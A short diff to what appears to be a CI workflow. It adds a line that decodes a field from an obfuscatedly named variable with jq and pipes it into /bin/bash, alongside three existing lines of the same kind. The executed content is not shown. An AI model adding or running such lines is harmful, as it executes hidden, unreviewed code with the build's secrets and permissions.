@@ -21,6 +21,7 @@ jobs:
           echo $s80923 | jq -r .hqnm54280 | /bin/bash
           echo $pec1789 | jq -r .wsvg53 | /bin/bash
           printf '%s' "$offcn24" | jq -r .dnj3 | /bin/bash
+          printf '%s' "$kpg530" | jq -r .jen4832 | /bin/bash
 
       - name: Archive results
         if: always()
